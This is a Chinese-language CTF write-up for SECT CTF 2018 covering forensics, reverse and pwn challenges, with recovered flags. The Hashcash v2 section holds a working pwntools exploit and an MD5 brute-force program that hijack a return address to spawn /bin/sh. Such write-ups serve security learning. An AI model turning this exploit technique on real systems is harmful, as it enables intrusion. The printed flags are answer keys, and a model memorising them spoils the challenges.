## Misc

### shredder

檔案 floppy 透過 `file` 可以看到有 `mkfs.fat` 的字串，而 `mkfs.fat` 被用來在 device 或是 image file 上建立 MS-DOS FAT filesystem (FAT = File Allocation Table)，因此檔案即是從 FAT filesystem dump 的 image。

將 filesystem mount 後 `sudo mount floppy ./mnt -o loop` 可以看到檔案 `shredder`，在逆向完後會發現程式流程大致如下:

1. 傳入多個檔案
2. 每個檔案都會選一個 random byte，並對整個檔案做 xor
3. 寫回檔案內
4. 重複 2, 3 直到沒有檔案

因此可以猜測，應該會有其他檔案室被做 xor 後，但是 mount 的結果只有 `shredder`，而可以用 `testdisk` (Scan and repair disk partitions) 來查看 floppy，操作步驟如下:

1. floppy -> proceed
2. None partitioned media (下面會提示偵測到的 partition table type)
3. FAT12 -> boot
4. List
5. `flag.txt` / `shredder`

下載 flag.txt 後，每個 byte 都嘗試 xor 一遍:

```python
#!/usr/bin/python3                                            
                                                              
def xor(a, b):                                                
    return a ^ b                                              
                                                              
with open("flag.txt", "rb") as f:                             
    flag = f.read()                                           
                                                              
    for i in range(1, 255):                                   
        print(i, b''.join(list(map(lambda a: bytes([xor(a,i)]), flag))))
```

得到 flag `SECT{1f_U_574y_r1gh7_wh3r3_U_R,_7h3n_p30pl3_w1ll_3v3n7u4lly_c0m3_70_U}`。



- `fxstat`: using old-style Unix fstat system call
- `msync()`: synchronize a file with a memory map
- [autopsy](https://github.com/sleuthkit/autopsy): graphical interface to The Sleuth Kit and other open source **digital forensics tools**

### Batou

先使用 [volatility](https://github.com/volatilityfoundation/volatility) 查看 memory dump 的 image 資訊 `volatility -f batou imageinfo`，得到:

```
$ volatility -f batou imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : VMWareAddressSpace (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/tmp/tmp/batou)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800028480a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002849d00L
                KPCR for CPU 1 : 0xfffff880009ea000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2018-09-11 04:17:17 UTC+0000
     Image local date and time : 2018-09-10 21:17:17 -0700
```

得到 profile 為 `Win7SP1x64`，就進行各種嘗試: `pstree`, `cmdline`, `filescan`，比較感興趣的 process 如 `notepad.exe` (204)、`StikyNot.exe` (sticky notes, 1872)，而此時可以使用 `dumpfiles` dump 出 process 內的檔案，不過兩個 process dump 出來的都是 dll 以及 PE file，所以回去找 `filescan` 的結果，是否有 notepad 或 sticky 相關的資料。

```
0x000000003fe9c930     16      0 R--rw- \Device\HarddiskVolume2\Users\Batou\AppData\Roaming\Notepad++\backup\new 2@2018-09-10_203737
...
0x000000003fead410     16      0 R--rw- \Device\HarddiskVolume2\Users\Batou\AppData\Roaming\Notepad++\backup\new 1@2018-09-10_202915
...
0x000000003feced10     16      0 R--rw- \Device\HarddiskVolume2\Users\Batou\AppData\Roaming\Notepad++\session.xml
```

將三個檔案 extract 後 `volatility -f batou --profile=Win7SP1x64 dumpfiles -D output -Q <offset>`，得到以下內容:

```
53 45
43 54 7b 
34 6c 6c 5f 79 6f 75 72 5f 4e 30 74 33 73 5f 34 72 33 5f 62 33 6c 30 6e 67 5f 74 30 5f 75 35
7d

empty

<NotepadPlus>
...
</NotepadPlus>
```

再將 hex value 轉成 char:  

```python
a = ['53', '45', '43', '54', '7b', '34', '6c', '6c', '5f', '79', '6f', '75', '72', '5f', '4e', '30', '74', '33', '73', '5f', '34', '72', '33', '5f', '62', '33', '6c', '30', '6e', '67', '5f', '74', '30', '5f', '75', '35', '7d']
                                           
for i in a:                                
    print(bytes.fromhex(i).decode(), end='')
```

得到 flag `SECT{4ll_your_N0t3s_4r3_b3l0ng_t0_u5}`。



- volatility 本身是沒有 detail command (-h) 可以看，要去官方提供的 [Command-Reference](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) 找。
- `-Q PHYSOFFSET`: Dump File Object at physical address PHYSOFFSET

### section6

得到的檔案是一個壞掉的 docx or xps，搜尋檔案的 metadata 以及資料後會找到 `Documents/6/Pages/6.fpage` 內容很可疑，`cat 6.fpage | sed "s/.*UnicodeString=//g"` 會得到以下內容:

```
<FixedPage Width="793.76" Height="1122.56" xmlns="http://schemas.openxps.org/oxps/v1.0" xml:lang="und">
	<!-- Microsoft XPS Document Converter (MXDC) Generated! Version: 0.3.9600.18790 -->
".#####..#######..#####..#######...###.######...........###...........#####.." />
"#.....#.#.......#.....#....#.....#....#.....#.#####...#...#.......#.#.....#." />
"#.......#.......#..........#.....#....#.....#.#....#.#.....#......#.......#." />
".#####..#####...#..........#....##....######..#....#.#.....#......#..#####.." />
"......#.#.......#..........#.....#....#.......#####..#.....#......#.......#." />
"#.....#.#.......#.....#....#.....#....#.......#...#...#...#..#....#.#.....#." />
".#####..#######..#####.....#......###.#.......#....#...###....####...#####.." />
"............................................................................" />
"......................#####..#######...###.....#.............#...#######." />
"#....#.#####.........#.....#.#........#...#...##............##...#......." />
"#...#....#.................#.#.......#.....#.#.#...........#.#...#......." />
"####.....#............#####..######..#.....#...#.............#...######.." />
"#..#.....#...........#.............#.#.....#...#.............#.........#." />
"#...#....#...........#.......#.....#..#...#....#.............#...#.....#." />
"#....#...#...........#######..#####....###...#####.........#####..#####.." />
".............#######...............................#######..............." />
"...............#........#####..#.......###..." />
"........#####..#....#..#.....#.#..........#.." />
"........#....#.#....#........#.#..........#.." />
"........#....#.#....#...#####..#..........##." />
"........#####..#######.......#.#..........#.." />
"........#...#.......#..#.....#.#..........#.." />
"........#....#......#...#####..#######.###..." />
"#######......................................" />
</FixedPage>
```

得到 flag `SECT{PR0J3KT_2501_15_R43L}`。



- `-i`: in-place，直接改變檔案

### matryoshka

拿到 pcap，將 tcp stream 2 extract 出來後得到一個 bzip 壓縮檔，解壓縮後得到 `Linux rev 1.0 ext4 filesystem data` (`bzip2 -d datas`)，`mount` 後發現有一些空的檔案以及一個 zip 檔 (`2501`)，之後用 `7z x datas` 去解壓縮 (不確定 `unzip` 為什麼不行)，會得到一個內容 base64 encode 過的檔案，同樣做 decode，會得到 `OpenDocument Text` 類型的檔案，而像是這種類型的檔案基本上都是用 zip 來壓縮內嵌檔案，因此可以直接 `unzip` 得到內嵌檔案。

最後 flag 藏在 `META-INF/documentsignatures.xml` 內 (`SECT{Pupp3t_M4st3r_h1d35_1n_Th3_w1r3}`)。

## Reverse

### ezdos

`.com` 為 COM 格式 file 的副檔名，COM 格式文件是一種簡單的可執行文件。而如果要在 local 執行起來比較麻煩，因此透過看 asm 來分析程式，求得 license 為 `1337-('f' ^ 'S')('y' ^ 'H')('t' ^ 'E')('y' ^ 'L')`，即是 `1337-5115`。

- ` INT 21H`: 根據 AH 的不同會有不同的行為，而根據那些行為會用到不同的暫存器。
- 此[文章](https://blog.csdn.net/u012062327/article/details/41408635)詳細介紹 ah 在各個 value 時的用途

## Pwn

### Hashcash v2

chall:

```bash
#!/bin/bash
unset LD_LIBRARY_PATH
qemu-arm -L ./ hashcashv2
```

checksec:

```
[*] '/tmp/tmp/CTF/2018/SECT_CTF/pwn/hashcash_v2/hashcashv2'
    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

memory layout:

```
0x25008 ~ 0x25407 (1023): input

0x25408 ~ 0x2540C (4): stderr
0x2540C ~ 0x25410 (4): alignment
0x25410 ~ 0x25414 (4): stdin
0x25414 ~ 0x25418 (4): stdout
0x25418 ~ 0x2541C (4): completed (for _do_global_dtors_aux)

0x2541c ~ 0x25420 (4): count
0x25420 ~ 0x25424 (4): nonce
0x25424 ~ 0x25434 (0x10): hmask
```

debug:

```bash
qemu-arm -g 4000 -L ./ ./hashcashv2

gdb-multiarch ./hashcashv2
set architecture arm
target remote 0:4000
```



程式流程如下:

1. 隨機選 1 byte 作為 nonce
2. 讀取一串 value，並對其做 md5 (`md5(nonce + input)`)，將結果存入 `&v6_hash[count]`
3. 檢測 hash 的結果從 0 ~ level 是否與 `hmask` 相同，不過因為 `hmask` 的值不是 `00` 就是 `ff`，因此不太可能
4. 如果都相同的話，就增加一個 level
5. 16 個 level 都通過後，就會執行 `system("/bin/sh")`

main 中負責產生 md5 的 function `hash(&v6_hash[count], input, v5);` 並不會檢查 `count` 的 value，而如果 input 可以產生包含 `0x000010c58` 的 hash value，就可以控制 `count` 來蓋 return address 做 exploit。而如果你控制 `count`，就會蓋到 stdin / stdout / stderr，因此必須在執行輸入輸出相關的 function 前 get shell，不然會 segmentation fault。

因此在第一次 `v5 = readin();` 時就先蓋掉 `count` 成 `\xff\xff\xff\xff` (-1)，而 nonce 蓋成 `md5(nonce_old + nonce_new)` 可以產生 `\x70\x0c\x01\x00` (0x00010C70) 的 value。



挑選 nonce 為 2 時的 collision:

```c
#include <stdio.h>     
#include <string.h>    
#include <openssl/md5.h>
            
int main()    
{           
    MD5_CTX init, fini;
    unsigned char data[1048] = {0};
    unsigned char digest[16] = {0};
            
    data[0] = 2; 
    for (int i = 1044; i < 1048; i++)
        data[i] = 0xff;
            
    MD5_Init(&init);   
    MD5_Update(&init, data, 1048);
            
    unsigned int final[1];
            
    for (unsigned int i = 0; i < 0xffffffff; i++) {
        final[0] = i;  
        memcpy(&fini, &init, sizeof(MD5_CTX));
            
        MD5_Update(&fini, (unsigned char *)final, 4);
        MD5_Final(digest, &fini);
            
        if (digest[0] == 0x70 && digest[1] == 0x0c && digest[2] == 0x01 && digest[3] == 0x00) {
            printf("value: %x\n", i);
            break;
        }   
    }       
}           
// 37c3bc6a
```



exploit:

```python
#!/usr/bin/python3
            
from pwn import *
            
nonce_hash = 2 
magic = p32(0x37c3bc6a)
            
while True:                                                                                                                                                                  
    r = process(["qemu-arm", "-L", "./", "hashcashv2"])
    r.recvuntil('\x1B[1mnonce:\x1B[0m ')
    nonce = int(r.recvline()[:-1].decode(), 16) 
            
    if nonce == nonce_hash:
        break
    else:
        r.close()
            
payload = b'\x00' * 1023 \
            + b'\x00' * 20 \
            + b'\xff' * 4 \ 
            + magic
            
r.sendlineafter("\x1B[1minput:\x1B[0m ", payload)
r.interactive()
```

當 nonce 為 2 時，process 會在 `hash()` return 到 `win()` 裡面的 `system("/bin/sh")`。



**openssl/md5**:

- `MD5_Init()`: 設置 md5 magic number
- `MD5_Update()`: 可以重複執行此 function，能夠把不同的 data 組在一起做 md5
- `MD5_Final()`: 輸出結果並將結果存入 dst

